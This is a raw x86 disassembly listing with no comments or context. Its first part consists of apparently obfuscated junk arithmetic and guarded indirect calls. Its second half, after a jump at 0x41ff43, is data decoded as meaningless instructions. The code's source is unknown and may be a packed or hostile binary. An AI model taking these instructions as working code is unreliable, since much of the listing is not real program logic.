  41f561:	cmp    DWORD PTR ds:0x4281c3,0x0
  41f568:	jg     0x41f5a9
  41f56e:	push   0x13fa
  41f573:	push   DWORD PTR [ebp-0x18]
  41f576:	push   0x47c2
  41f57b:	push   DWORD PTR [ebp-0x1c]
  41f57e:	push   0x5b80
  41f583:	push   DWORD PTR [ebp-0x10]
  41f586:	push   0x6360
  41f58b:	push   0x2aad
  41f590:	push   DWORD PTR [ebp-0x28]
  41f593:	push   DWORD PTR [ebp-0x10]
  41f596:	call   DWORD PTR ds:0x428e78
  41f59c:	inc    edx
  41f59d:	adc    DWORD PTR ds:0x4281a3,edi
  41f5a3:	and    DWORD PTR ds:0x42833b,ecx
  41f5a9:	movzx  edx,WORD PTR ds:0x428353
  41f5b0:	add    edx,DWORD PTR ds:0x42834b
  41f5b6:	mov    DWORD PTR ds:0x428353,edx
  41f5bc:	add    DWORD PTR ds:0x428347,0x7749
  41f5c6:	adc    DWORD PTR ds:0x4282ab,0x1ba
  41f5d0:	dec    edx
  41f5d1:	sub    DWORD PTR ds:0x4283df,0x6520
  41f5db:	or     ecx,0x2a20
  41f5e1:	mov    DWORD PTR ds:0x4281eb,0x1cbf
  41f5eb:	mov    edx,DWORD PTR [ebp-0x70]
  41f5ee:	adc    DWORD PTR ds:0x42836f,0x2406
  41f5f8:	xor    ecx,edx
  41f5fa:	or     DWORD PTR ds:0x42835f,ecx
  41f600:	mov    edx,DWORD PTR [ebp+0x14]
  41f603:	adc    DWORD PTR ds:0x4283e3,0x652b
  41f60d:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41f614:	xor    DWORD PTR ds:0x4282a7,0x49e9
  41f61e:	lea    eax,[ecx+eax*1-0x45a1]
  41f625:	cmp    DWORD PTR ds:0x4282bb,0x0
  41f62c:	mov    ecx,0x2e1f
  41f631:	mov    DWORD PTR ds:0x4282d7,ecx
  41f637:	mov    ecx,0x173d
  41f63c:	not    DWORD PTR ds:0x4282a3
  41f642:	jmp    0x41f698
  41f647:	mov    DWORD PTR ds:0x4282ef,0x35b0
  41f651:	cmp    DWORD PTR ds:0x4282bb,0x0
  41f658:	jae    0x41f680
  41f65e:	push   0x2832
  41f663:	call   DWORD PTR ds:0x428e7c
  41f669:	dec    ecx
  41f66a:	or     DWORD PTR ds:0x42827b,0x127d
  41f674:	mov    ecx,DWORD PTR ds:0x428347
  41f67a:	add    DWORD PTR ds:0x42836b,ecx
  41f680:	sbb    DWORD PTR ds:0x4282df,ebx
  41f686:	mov    ecx,DWORD PTR ds:0x4281b3
  41f68c:	adc    DWORD PTR ds:0x4281a7,ecx
  41f692:	and    ecx,0x3d62
  41f698:	mov    DWORD PTR [ebp-0xb0],eax
  41f69e:	mov    ecx,DWORD PTR ds:0x42840f
  41f6a4:	mov    ecx,DWORD PTR [ecx]
  41f6a6:	xor    DWORD PTR ds:0x42829f,ecx
  41f6ac:	mov    DWORD PTR [ebp-0x11c],0x303f
  41f6b6:	not    eax
  41f6b8:	mov    DWORD PTR [ebp-0x98],0x51a9
  41f6c2:	sub    DWORD PTR ds:0x428373,0x1cf2
  41f6cc:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41f6d6:	xor    eax,ecx
  41f6d8:	mov    eax,DWORD PTR [ebp-0xcc]
  41f6de:	cmp    DWORD PTR ds:0x428357,0x0
  41f6e5:	mov    DWORD PTR ds:0x42835f,0x6375
  41f6ef:	not    DWORD PTR ds:0x4281bf
  41f6f5:	mov    DWORD PTR ds:0x42827b,ecx
  41f6fb:	jmp    0x41f76f
  41f700:	mov    DWORD PTR ds:0x42828b,0x2351
  41f70a:	mov    DWORD PTR ds:0x4282cf,ebx
  41f710:	cmp    DWORD PTR ds:0x428357,0x0
  41f717:	jb     0x41f758
  41f71d:	push   0x3851
  41f722:	push   0x4282bb
  41f727:	call   DWORD PTR ds:0x428e80
  41f72d:	movzx  ecx,WORD PTR ds:0x42828b
  41f734:	xor    DWORD PTR ds:0x4283f7,ecx
  41f73a:	mov    ecx,DWORD PTR ds:0x4282bb
  41f740:	add    ecx,DWORD PTR ds:0x4282b3
  41f746:	mov    DWORD PTR ds:0x4282bb,ecx
  41f74c:	mov    ecx,DWORD PTR ds:0x4282cb
  41f752:	adc    DWORD PTR ds:0x4283db,ecx
  41f758:	inc    ecx
  41f759:	xor    DWORD PTR ds:0x428377,ebx
  41f75f:	sub    DWORD PTR ds:0x4281d7,edx
  41f765:	and    DWORD PTR ds:0x428357,0x3308
  41f76f:	xor    eax,0x6f65
  41f774:	add    DWORD PTR ds:0x42836b,edx
  41f77a:	mov    ecx,DWORD PTR [ebp-0x98]
  41f780:	add    DWORD PTR ds:0x4283d7,0x42834b
  41f78a:	or     eax,ecx
  41f78c:	and    DWORD PTR ds:0x428287,0x3807
  41f796:	add    eax,0x161e
  41f79b:	or     ecx,DWORD PTR ds:0x428297
  41f7a1:	mov    ecx,DWORD PTR [ebp-0x11c]
  41f7a7:	add    DWORD PTR ds:0x42828b,0x4281e7
  41f7b1:	or     eax,ecx
  41f7b3:	add    DWORD PTR ds:0x4283d7,edi
  41f7b9:	add    eax,0x1cca
  41f7be:	or     ecx,DWORD PTR ds:0x4282d7
  41f7c4:	xor    eax,0x96c9
  41f7c9:	mov    DWORD PTR [ebp-0x38],eax
  41f7cc:	cmp    DWORD PTR ds:0x4283e3,0x0
  41f7d3:	mov    ecx,DWORD PTR ds:0x4283c7
  41f7d9:	mov    DWORD PTR ds:0x4283bb,ecx
  41f7df:	mov    DWORD PTR ds:0x42835f,0x7d57
  41f7e9:	jmp    0x41f8c3
  41f7ee:	mov    DWORD PTR ds:0x4282df,0xe1
  41f7f8:	mov    DWORD PTR ds:0x4281d7,edi
  41f7fe:	cmp    DWORD PTR ds:0x4283e3,0x0
  41f805:	jne    0x41f836
  41f80b:	push   DWORD PTR [ebp-0xc]
  41f80e:	push   0x427fca
  41f813:	push   0x427f31
  41f818:	call   DWORD PTR ds:0x428ef8
  41f81e:	sub    ecx,ecx
  41f820:	xor    ecx,ecx
  41f822:	add    ecx,DWORD PTR ds:0x42840b
  41f828:	mov    ecx,DWORD PTR [ecx]
  41f82a:	add    DWORD PTR ds:0x4282c7,ecx
  41f830:	adc    DWORD PTR ds:0x4281af,edi
  41f836:	and    DWORD PTR ds:0x4283ef,0x3101
  41f840:	mov    DWORD PTR ds:0x4283f7,0x28b7
  41f84a:	cmp    DWORD PTR ds:0x4281bf,0x0
  41f851:	mov    ecx,DWORD PTR ds:0x4282af
  41f857:	mov    DWORD PTR ds:0x42829b,0x4504
  41f861:	mov    DWORD PTR ds:0x4283cf,0x3c46
  41f86b:	mov    ecx,DWORD PTR ds:0x4283f3
  41f871:	jmp    0x41f8c3
  41f876:	mov    DWORD PTR ds:0x42835f,ebx
  41f87c:	cmp    DWORD PTR ds:0x4281bf,0x0
  41f883:	jge    0x41f8b3
  41f889:	push   0x1
  41f88b:	push   0x427ffc
  41f890:	push   0x428006
  41f895:	call   DWORD PTR ds:0x428efc
  41f89b:	and    DWORD PTR ds:0x4281d7,ebx
  41f8a1:	add    ecx,ecx
  41f8a3:	adc    DWORD PTR ds:0x42835f,0x1bb
  41f8ad:	and    ecx,DWORD PTR ds:0x4283f3
  41f8b3:	sub    ecx,0x5232
  41f8b9:	sub    DWORD PTR ds:0x4281c7,0x6c90
  41f8c3:	mov    DWORD PTR [ebp-0x118],0x6083
  41f8cd:	or     DWORD PTR ds:0x4282b7,ebx
  41f8d3:	mov    DWORD PTR [ebp-0x88],0x556
  41f8dd:	mov    DWORD PTR [ebp-0x140],0x6c7d
  41f8e7:	mov    eax,DWORD PTR [ebp-0x140]
  41f8ed:	add    eax,0x5af8
  41f8f2:	xor    DWORD PTR ds:0x4283cb,0x37e5
  41f8fc:	mov    ecx,DWORD PTR [ebp-0x88]
  41f902:	sub    DWORD PTR ds:0x4281b3,0x4283ef
  41f90c:	sub    eax,ecx
  41f90e:	dec    DWORD PTR ds:0x4282c7
  41f914:	mov    ecx,DWORD PTR [ebp-0x118]
  41f91a:	lea    eax,[eax+ecx*1+0x68dc]
  41f921:	or     eax,0x52f6
  41f926:	adc    ecx,DWORD PTR ds:0x42827f
  41f92c:	sub    eax,0x1dbfe
  41f931:	mov    DWORD PTR [ebp-0xac],eax
  41f937:	cmp    DWORD PTR ds:0x428343,0x0
  41f93e:	mov    DWORD PTR ds:0x428353,0x63c0
  41f948:	mov    DWORD PTR ds:0x4281e3,0x2316
  41f952:	mov    ecx,0x40fd
  41f957:	jmp    0x41f99f
  41f95c:	mov    eax,ds:0x4282ef
  41f961:	mov    eax,0x5fd6
  41f966:	cmp    DWORD PTR ds:0x428343,0x0
  41f96d:	je     0x41f98d
  41f973:	call   DWORD PTR ds:0x428f00
  41f979:	sbb    DWORD PTR ds:0x4283f3,0x209
  41f983:	xor    DWORD PTR ds:0x4283e3,0x72db
  41f98d:	add    ecx,ecx
  41f98f:	and    DWORD PTR ds:0x4282df,0x6064
  41f999:	or     ecx,0x4aaa
  41f99f:	mov    DWORD PTR [ebp-0x6c],0x4b56
  41f9a6:	mov    DWORD PTR [ebp-0x100],0x49f7
  41f9b0:	xor    ecx,eax
  41f9b2:	mov    eax,DWORD PTR [ebp-0x100]
  41f9b8:	movzx  ecx,WORD PTR ds:0x4281e3
  41f9bf:	or     DWORD PTR ds:0x4283cf,ecx
  41f9c5:	add    eax,0x7b60
  41f9ca:	cmp    DWORD PTR ds:0x428347,0x0
  41f9d1:	mov    DWORD PTR ds:0x42828b,0x756d
  41f9db:	mov    DWORD PTR ds:0x428343,0x1d60
  41f9e5:	jmp    0x41fa41
  41f9ea:	mov    ecx,DWORD PTR ds:0x42834b
  41f9f0:	cmp    DWORD PTR ds:0x428347,0x0
  41f9f7:	jg     0x41fa21
  41f9fd:	push   0x59e0
  41fa02:	call   DWORD PTR ds:0x428e84
  41fa08:	adc    DWORD PTR ds:0x4283df,ebx
  41fa0e:	sbb    DWORD PTR ds:0x428363,ebx
  41fa14:	movzx  ecx,WORD PTR ds:0x4283bb
  41fa1b:	add    DWORD PTR ds:0x4283cb,ecx
  41fa21:	add    DWORD PTR ds:0x4283c3,0x77eb
  41fa2b:	or     DWORD PTR ds:0x428343,0x2dfb
  41fa35:	mov    ecx,DWORD PTR ds:0x4282ef
  41fa3b:	and    DWORD PTR ds:0x4281af,ecx
  41fa41:	imul   eax,eax,0x5ea
  41fa47:	mov    ecx,DWORD PTR [ebp-0x6c]
  41fa4a:	add    DWORD PTR ds:0x42829b,0x4281db
  41fa54:	imul   eax,ecx
  41fa57:	xor    edx,edx
  41fa59:	mov    ecx,0x3218d
  41fa5e:	div    ecx
  41fa60:	or     DWORD PTR ds:0x4282e3,edx
  41fa66:	sub    eax,0x24c1
  41fa6b:	mov    DWORD PTR [ebp-0xa8],eax
  41fa71:	cmp    DWORD PTR ds:0x4282c7,0x0
  41fa78:	mov    ecx,0x571f
  41fa7d:	mov    DWORD PTR ds:0x428357,edi
  41fa83:	jmp    0x41faef
  41fa88:	mov    eax,ds:0x4281e7
  41fa8d:	mov    DWORD PTR ds:0x4281df,0x4079
  41fa97:	cmp    DWORD PTR ds:0x4282c7,0x0
  41fa9e:	jb     0x41fac8
  41faa4:	push   0x4280d3
  41faa9:	push   DWORD PTR [ebp-0xc]
  41faac:	call   DWORD PTR ds:0x428e88
  41fab2:	adc    ecx,ecx
  41fab4:	dec    ecx
  41fab5:	movzx  ecx,BYTE PTR ds:0x4281a3
  41fabc:	sbb    ecx,DWORD PTR ds:0x42829b
  41fac2:	mov    DWORD PTR ds:0x4281a3,ecx
  41fac8:	xor    DWORD PTR ds:0x4282eb,edx
  41face:	movzx  ecx,WORD PTR ds:0x4282a3
  41fad5:	or     DWORD PTR ds:0x42833b,ecx
  41fadb:	xor    ecx,ecx
  41fadd:	add    ecx,DWORD PTR ds:0x4283cb
  41fae3:	add    DWORD PTR ds:0x4282df,ecx
  41fae9:	and    ecx,DWORD PTR ds:0x4281bb
  41faef:	mov    DWORD PTR [ebp-0x84],0x2c40
  41faf9:	cmp    DWORD PTR ds:0x4281eb,0x0
  41fb00:	mov    ecx,DWORD PTR ds:0x42834f
  41fb06:	mov    DWORD PTR ds:0x4283d3,edx
  41fb0c:	mov    DWORD PTR ds:0x4281af,ebx
  41fb12:	mov    DWORD PTR ds:0x428357,0x3231
  41fb1c:	jmp    0x41fb72
  41fb21:	not    eax
  41fb23:	cmp    DWORD PTR ds:0x4281eb,0x0
  41fb2a:	jne    0x41fb54
  41fb30:	push   0x4d84
  41fb35:	push   0x8040
  41fb3a:	call   DWORD PTR ds:0x428e8c
  41fb40:	and    ecx,ecx
  41fb42:	mov    ecx,DWORD PTR ds:0x4283f3
  41fb48:	or     ecx,DWORD PTR ds:0x4282c3
  41fb4e:	mov    DWORD PTR ds:0x4283f3,ecx
  41fb54:	mov    ecx,DWORD PTR ds:0x4281bb
  41fb5a:	add    ecx,DWORD PTR ds:0x4283f3
  41fb60:	mov    DWORD PTR ds:0x4281bb,ecx
  41fb66:	sbb    DWORD PTR ds:0x4282db,ecx
  41fb6c:	adc    ecx,DWORD PTR ds:0x4282ef
  41fb72:	mov    DWORD PTR [ebp-0x18],0x6013
  41fb79:	xor    ecx,DWORD PTR ds:0x42829f
  41fb7f:	mov    DWORD PTR [ebp-0x80],0xc
  41fb86:	or     DWORD PTR ds:0x4282a7,ecx
  41fb8c:	mov    eax,DWORD PTR [ebp-0x18]
  41fb8f:	sub    DWORD PTR ds:0x4281df,edi
  41fb95:	mov    ecx,DWORD PTR [ebp-0x80]
  41fb98:	or     DWORD PTR ds:0x4282d7,0x4282db
  41fba2:	xor    edx,edx
  41fba4:	xor    DWORD PTR ds:0x4283eb,0x428353
  41fbae:	div    ecx
  41fbb0:	imul   eax,eax,0x4312
  41fbb6:	add    eax,0x5abe
  41fbbb:	cmp    DWORD PTR ds:0x4283bf,0x0
  41fbc2:	mov    DWORD PTR ds:0x4281eb,ebx
  41fbc8:	mov    DWORD PTR ds:0x4283f7,0x6142
  41fbd2:	jmp    0x41fc37
  41fbd7:	mov    DWORD PTR ds:0x4282c7,0x13f4
  41fbe1:	mov    DWORD PTR ds:0x4281c7,0x47aa
  41fbeb:	cmp    DWORD PTR ds:0x4283bf,0x0
  41fbf2:	jne    0x41fc15
  41fbf8:	push   0x42812f
  41fbfd:	call   DWORD PTR ds:0x428e90
  41fc03:	and    ecx,DWORD PTR ds:0x4282b3
  41fc09:	adc    DWORD PTR ds:0x428343,ecx
  41fc0f:	sub    DWORD PTR ds:0x42834b,edi
  41fc15:	mov    ecx,DWORD PTR ds:0x4283bb
  41fc1b:	sbb    ecx,DWORD PTR ds:0x42827b
  41fc21:	mov    DWORD PTR ds:0x4283bb,ecx
  41fc27:	and    DWORD PTR ds:0x428363,0x55d2
  41fc31:	add    DWORD PTR ds:0x4281df,ecx
  41fc37:	mov    ecx,DWORD PTR [ebp-0x84]
  41fc3d:	adc    DWORD PTR ds:0x4282cf,0x1028
  41fc47:	xor    eax,ecx
  41fc49:	or     ecx,DWORD PTR ds:0x4282df
  41fc4f:	xor    edx,edx
  41fc51:	or     ecx,DWORD PTR ds:0x4281ab
  41fc57:	mov    ecx,0x5ae
  41fc5c:	sub    DWORD PTR ds:0x4282c7,0x4356
  41fc66:	div    ecx
  41fc68:	cmp    DWORD PTR ds:0x42827f,0x0
  41fc6f:	mov    ecx,0x1d02
  41fc74:	mov    DWORD PTR ds:0x4282e3,ebx
  41fc7a:	mov    DWORD PTR ds:0x4282f7,0x2746
  41fc84:	mov    DWORD PTR ds:0x4282c7,edx
  41fc8a:	jmp    0x41fcee
  41fc8f:	mov    DWORD PTR ds:0x4281bb,0x6e43
  41fc99:	cmp    DWORD PTR ds:0x42827f,0x0
  41fca0:	jbe    0x41fccb
  41fca6:	push   0x29e8
  41fcab:	push   0x54b0
  41fcb0:	push   DWORD PTR [ebp-0x28]
  41fcb3:	call   DWORD PTR ds:0x428f04
  41fcb9:	neg    ecx
  41fcbb:	sbb    ecx,DWORD PTR ds:0x4283f3
  41fcc1:	and    DWORD PTR ds:0x4281bb,0x42836f
  41fccb:	mov    ecx,DWORD PTR ds:0x4281c3
  41fcd1:	xor    DWORD PTR ds:0x42828f,ecx
  41fcd7:	movzx  ecx,BYTE PTR ds:0x4282d7
  41fcde:	sub    DWORD PTR ds:0x4283e3,ecx
  41fce4:	mov    DWORD PTR ds:0x428293,0x7a81
  41fcee:	xor    eax,0x5e8c
  41fcf3:	adc    ecx,0x10d9
  41fcf9:	mov    DWORD PTR [ebp-0x48],eax
  41fcfc:	mov    DWORD PTR [ebp-0x13c],0x7b18
  41fd06:	mov    eax,ds:0x4283f7
  41fd0b:	add    eax,DWORD PTR ds:0x4281bf
  41fd11:	mov    ds:0x4283f7,eax
  41fd16:	mov    DWORD PTR [ebp-0x138],0x1169
  41fd20:	xor    ecx,ecx
  41fd22:	mov    DWORD PTR [ebp-0x12c],0x1379
  41fd2c:	cmp    DWORD PTR ds:0x428363,0x0
  41fd33:	mov    ecx,DWORD PTR ds:0x42834b
  41fd39:	mov    ecx,DWORD PTR ds:0x4283db
  41fd3f:	mov    ecx,0x2973
  41fd44:	movzx  ecx,WORD PTR ds:0x42827b
  41fd4b:	jmp    0x41fd9c
  41fd50:	mov    eax,0x21a8
  41fd55:	mov    eax,0x38ee
  41fd5a:	cmp    DWORD PTR ds:0x428363,0x0
  41fd61:	ja     0x41fd84
  41fd67:	push   DWORD PTR [ebp-0x20]
  41fd6a:	call   DWORD PTR ds:0x428e94
  41fd70:	and    ecx,ecx
  41fd72:	xor    DWORD PTR ds:0x4282c3,0x6e97
  41fd7c:	add    ecx,ecx
  41fd7e:	or     DWORD PTR ds:0x42829f,edx
  41fd84:	mov    ecx,DWORD PTR ds:0x428303
  41fd8a:	mov    ecx,DWORD PTR [ecx]
  41fd8c:	sbb    DWORD PTR ds:0x4282ef,ecx
  41fd92:	sbb    DWORD PTR ds:0x4283e3,0x42836b
  41fd9c:	mov    eax,DWORD PTR [ebp-0x12c]
  41fda2:	mov    ecx,0x5856
  41fda7:	sub    ecx,eax
  41fda9:	shr    ecx,0x2
  41fdac:	sub    ecx,0x5be6
  41fdb2:	xor    eax,0xe7a
  41fdb7:	mov    eax,DWORD PTR [ebp-0x138]
  41fdbd:	imul   ecx,eax
  41fdc0:	mov    eax,DWORD PTR [ebp-0x13c]
  41fdc6:	sbb    DWORD PTR ds:0x42835f,0x428363
  41fdd0:	and    ecx,eax
  41fdd2:	xor    DWORD PTR ds:0x4281cf,edx
  41fdd8:	mov    eax,0x3b18
  41fddd:	sub    eax,ecx
  41fddf:	mov    DWORD PTR [ebp-0xfc],eax
  41fde5:	mov    DWORD PTR [ebp-0x28],0x16d7
  41fdec:	mov    DWORD PTR [ebp-0x134],0x6b4
  41fdf6:	sub    eax,DWORD PTR ds:0x4283bf
  41fdfc:	mov    eax,DWORD PTR [ebp-0x134]
  41fe02:	xor    ecx,0x2b1a
  41fe08:	or     eax,0x4f70
  41fe0d:	xor    ecx,ecx
  41fe0f:	add    ecx,DWORD PTR ds:0x4283bf
  41fe15:	xor    DWORD PTR ds:0x4283c7,ecx
  41fe1b:	mov    ecx,DWORD PTR [ebp-0x28]
  41fe1e:	or     eax,ecx
  41fe20:	sub    eax,0x5ff7
  41fe25:	mov    DWORD PTR [ebp-0xc8],eax
  41fe2b:	adc    eax,ecx
  41fe2d:	mov    DWORD PTR [ebp-0xe4],0x5f39
  41fe37:	sub    ecx,ecx
  41fe39:	mov    DWORD PTR [ebp-0xc4],0x6236
  41fe43:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  41fe4a:	cmp    DWORD PTR ds:0x4281bf,0x0
  41fe51:	not    DWORD PTR ds:0x4282eb
  41fe57:	mov    DWORD PTR ds:0x428287,edx
  41fe5d:	jmp    0x41feb6
  41fe62:	mov    eax,0x4320
  41fe67:	cmp    DWORD PTR ds:0x4281bf,0x0
  41fe6e:	jne    0x41fe8d
  41fe74:	push   DWORD PTR [ebp-0x28]
  41fe77:	call   DWORD PTR ds:0x428e98
  41fe7d:	and    DWORD PTR ds:0x4283d7,0x4195
  41fe87:	add    ecx,DWORD PTR ds:0x42828f
  41fe8d:	movzx  ecx,WORD PTR ds:0x428367
  41fe94:	and    DWORD PTR ds:0x428343,ecx
  41fe9a:	and    DWORD PTR ds:0x4282b7,edx
  41fea0:	add    ecx,0x2485
  41fea6:	mov    eax,ds:0x4281fb
  41feab:	mov    ecx,DWORD PTR ds:0x42842f
  41feb1:	sub    ecx,eax
  41feb3:	and    eax,DWORD PTR [eax+ecx*1]
  41feb6:	mov    DWORD PTR [ebp-0x128],0x7537
  41fec0:	not    ecx
  41fec2:	mov    DWORD PTR [ebp-0x114],0x6985
  41fecc:	movzx  ecx,BYTE PTR ds:0x4281df
  41fed3:	or     DWORD PTR ds:0x4283f3,ecx
  41fed9:	mov    DWORD PTR [ebp-0x14],0x5627
  41fee0:	cmp    DWORD PTR ds:0x4282bb,0x0
  41fee7:	mov    ecx,0x306f
  41feec:	mov    DWORD PTR ds:0x4283bf,0x1b86
  41fef6:	jmp    0x41ff30
  41fefb:	mov    eax,0x6a49
  41ff00:	mov    DWORD PTR ds:0x42833b,ecx
  41ff06:	cmp    DWORD PTR ds:0x4282bb,0x0
  41ff0d:	jae    0x41ff28
  41ff13:	push   0x4281a3
  41ff18:	call   DWORD PTR ds:0x428f08
  41ff1e:	or     ecx,DWORD PTR ds:0x4281c3
  41ff24:	and    ecx,ecx
  41ff26:	adc    ecx,ecx
  41ff28:	adc    DWORD PTR ds:0x428367,ecx
  41ff2e:	sbb    ecx,ecx
  41ff30:	mov    DWORD PTR [ebp-0x64],0x72e7
  41ff37:	mov    eax,DWORD PTR [ebp-0x14]
  41ff3a:	and    DWORD PTR ds:0x42828b,edi
  41ff40:	add    eax,DWORD PTR [ebp-0x64]
  41ff43:	jmp    0x42029f
  41ff48:	test   DWORD PTR [edx],edi
  41ff4a:	cmp    BYTE PTR [eax+0x2e],ah
  41ff4d:	pop    edx
  41ff4e:	cmp    eax,0x6ff09f1a
  41ff53:	mov    al,0xb7
  41ff55:	lods   eax,DWORD PTR ds:[esi]
  41ff56:	jmp    0x16652305
  41ff5b:	sbb    BYTE PTR [ebx+0x49181812],ah
  41ff61:	lea    ecx,[ebp+0x29]
  41ff64:	xor    BYTE PTR [ebp-0x14bf430b],ch
  41ff6a:	stos   BYTE PTR es:[edi],al
  41ff6b:	aas    
  41ff6c:	push   0x99cf6039
  41ff71:	pop    esi
  41ff72:	xor    BYTE PTR [edx],0x98
  41ff75:	out    0xbd,al
  41ff77:	push   esp
  41ff78:	jmp    0x41ff47
  41ff7a:	pop    ds
  41ff7b:	sub    ebx,DWORD PTR [edx]
  41ff7d:	jge    0x41ffd9
  41ff7f:	dec    ebx
  41ff80:	add    BYTE PTR [ecx],al
  41ff82:	setle  ch
  41ff85:	xor    eax,0x6efea231
  41ff8a:	add    ebp,0x61
  41ff8d:	rcr    DWORD PTR ds:0x3bfe78bd,cl
  41ff93:	xlat   BYTE PTR ds:[ebx]
  41ff94:	add    dl,BYTE PTR [ebx]
  41ff96:	popf   
  41ff97:	adc    eax,0x27d1818c
  41ff9c:	cs popa 
  41ff9e:	fwait
  41ff9f:	sub    bh,bh
  41ffa1:	jns    0x41ffa9
  41ffa3:	mov    edx,0xdef08f59
  41ffa8:	mov    ds,WORD PTR [esi-0x3098b544]
  41ffae:	adc    eax,0xffffffe1
  41ffb1:	test   BYTE PTR [ebp+0x7c],ah
  41ffb4:	inc    esp
  41ffb5:	leave  
  41ffb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffb7:	mov    bl,0x92
  41ffb9:	fwait
  41ffba:	es push cs
  41ffbc:	int3   
  41ffbd:	mov    esi,0xed1efbb7
  41ffc2:	out    dx,eax
  41ffc3:	cmp    al,0x5e
  41ffc5:	xchg   esi,eax
  41ffc6:	inc    ebx
  41ffc7:	dec    esp
  41ffc8:	out    0x4c,al
  41ffca:	or     cl,bl
  41ffcc:	stos   BYTE PTR es:[edi],al
  41ffcd:	test   eax,0xb47c9efd
  41ffd2:	push   es
  41ffd3:	mul    BYTE PTR [esi+eiz*8]
  41ffd6:	or     ebp,DWORD PTR [edx]
  41ffd8:	(bad)  
  41ffd9:	or     esp,ebx
  41ffdb:	ret    0xaede
  41ffde:	scas   eax,DWORD PTR es:[edi]
  41ffdf:	iret   
  41ffe0:	inc    esp
  41ffe1:	cs adc eax,0xf62331e7
  41ffe7:	inc    esp
  41ffe8:	sti    
  41ffe9:	loope  0x41ffa3
  41ffeb:	jne    0x41ff99
  41ffed:	clc    
  41ffee:	mov    bl,0x0
  41fff0:	fld    TBYTE PTR [edx-0x964e92d]
  41fff6:	push   DWORD PTR [esi-0xe]
  41fff9:	sub    eax,0x100c3e04
  41fffe:	sbb    esi,edi
  420000:	mov    ebx,0x755a15a6
  420005:	pop    ebx
  420006:	daa    
  420007:	bound  esi,QWORD PTR [ecx]
  420009:	call   0xe8fd59f5
  42000e:	xor    DWORD PTR [edx+ebx*2],esi
  420011:	arpl   WORD PTR [edi+0x1ee79fce],dx
  420017:	mov    edx,0x2a03790d
  42001c:	ret    
  42001d:	pop    ecx
  42001e:	shr    BYTE PTR [esi],1
  420020:	idiv   DWORD PTR [ebx+0x25]
  420023:	xor    ecx,DWORD PTR [esi]
  420025:	dec    esp
  420026:	ret    
  420027:	push   ecx
  420028:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420029:	dec    ecx
  42002a:	dec    ecx
  42002b:	mov    dl,0x3c
  42002d:	push   ds
  42002e:	popa   
  42002f:	mov    esi,0x22cd9021
  420034:	mov    esi,edi
  420036:	in     al,0x15
  420038:	fs and eax,0x25369082
  42003e:	test   al,0xbd
  420040:	test   al,0xfe
  420042:	ss idiv bh
  420045:	out    dx,eax
  420046:	aad    0xed
  420048:	or     eax,0x29c9def3
  42004d:	retf   
  42004e:	jae    0x42003d
  420050:	in     al,dx
  420051:	add    BYTE PTR [ebx-0x7fd55844],0xce
  420058:	xchg   ebp,eax
  420059:	jb     0x420037
  42005b:	mov    ebp,0x5afd202a
  420060:	jg     0x420084
  420062:	xchg   BYTE PTR [edi-0x64ee761],ch
  420068:	call   0xd8872e33
  42006d:	shr    edx,1
  42006f:	scas   al,BYTE PTR es:[edi]
  420070:	repnz ror eax,1
  420073:	popa   
  420074:	and    ebp,DWORD PTR [ebx-0x6479b5de]
  42007a:	outs   dx,DWORD PTR ds:[esi]
  42007b:	mov    al,ds:0xab02aee5
  420080:	jle    0x42002a
  420082:	retf   0x555e
  420085:	cmp    edx,DWORD PTR fs:[esi+0x575410b]
  42008c:	mov    ds:0xf136e975,eax
  420091:	mov    ebp,DWORD PTR [eax-0x7fab3bb1]
  420097:	mov    bl,bh
  420099:	test   eax,0xc0ad63a6
  42009e:	inc    DWORD PTR [edi+eiz*2+0x74]
  4200a2:	fistp  DWORD PTR [esi+0x5ef14984]
  4200a8:	xchg   esi,eax
  4200a9:	sub    DWORD PTR [edx-0x82bbdbd],edx
  4200af:	pop    ebp
  4200b0:	xchg   edi,eax
  4200b1:	je     0x42004a
  4200b3:	js     0x420103
  4200b5:	mov    bl,0x1a
  4200b7:	out    dx,al
  4200b8:	mov    dl,0x29
  4200ba:	mov    es,WORD PTR ds:0xd21a92e5
  4200c0:	sub    eax,0xc4f53f4c
  4200c5:	push   edi
  4200c6:	sub    eax,0x132b74bf
  4200cb:	js     0x42008c
  4200cd:	dec    ebp
  4200ce:	push   ebp
  4200cf:	ds push ebx
  4200d1:	pop    edx
  4200d2:	add    DWORD PTR [edx+edx*1+0x78335f78],ecx
  4200d9:	ficomp WORD PTR [eax]
  4200db:	push   esp
  4200dc:	add    DWORD PTR [ebp+0x1c2a8410],edx
  4200e2:	popa   
  4200e3:	xlat   BYTE PTR ds:[ebx]
  4200e4:	ins    BYTE PTR es:[edi],dx
  4200e5:	mov    bh,0x73
  4200e7:	pop    eax
  4200e8:	add    al,0x8e
  4200ea:	mov    bl,BYTE PTR [ecx+ebx*1+0x65bf1ef3]
  4200f1:	add    BYTE PTR [ebp+0x60],bh
  4200f4:	loop   0x4200ff
  4200f6:	(bad)  
  4200f7:	mov    bl,0xc0
  4200f9:	aas    
  4200fa:	xchg   DWORD PTR [ebp+0x37],edx
  4200fd:	add    dl,cl
  4200ff:	xor    ebp,edi
  420101:	and    eax,0x49ef832a
  420106:	sub    dl,BYTE PTR [edi+esi*4-0x38]
  42010a:	adc    DWORD PTR [edx-0x16d74d81],esp
  420110:	(bad)  
  420111:	dec    esi
  420112:	sub    esp,ebx
  420114:	mov    ebx,0xb873fb8e
  420119:	std    
  42011a:	push   eax
  42011b:	lods   eax,DWORD PTR ds:[esi]
  42011c:	pop    ds
  42011d:	mov    esp,DWORD PTR [ebx-0x7006ee8c]
  420123:	mov    ebx,0xe91e111a
  420128:	scas   eax,DWORD PTR es:[edi]
  420129:	jp     0x4200dc
  42012b:	sbb    DWORD PTR [edx+0x6b288d8c],esp
  420131:	inc    eax
  420132:	jmp    0x88ca:0xa3ed2bbd
  420139:	jmp    0x4200fa
  42013b:	enter  0xcda7,0xcb
  42013f:	js     0x42010e
  420141:	xchg   BYTE PTR [ecx-0x5],ch
  420144:	and    al,0xe7
  420146:	enter  0xd32e,0xdc
  42014a:	rol    BYTE PTR [ecx+0xb],0xf5
  42014e:	dec    edi
  42014f:	clc    
  420150:	lahf   
  420151:	mov    esp,0xe50d0b9c
  420156:	aad    0xf
  420158:	jmp    0xde5f70d7
  42015d:	adc    BYTE PTR [esp+edx*4],0xde
  420161:	jne    0x420178
  420163:	jne    0x420146
  420165:	mov    ds:0x46f863e8,al
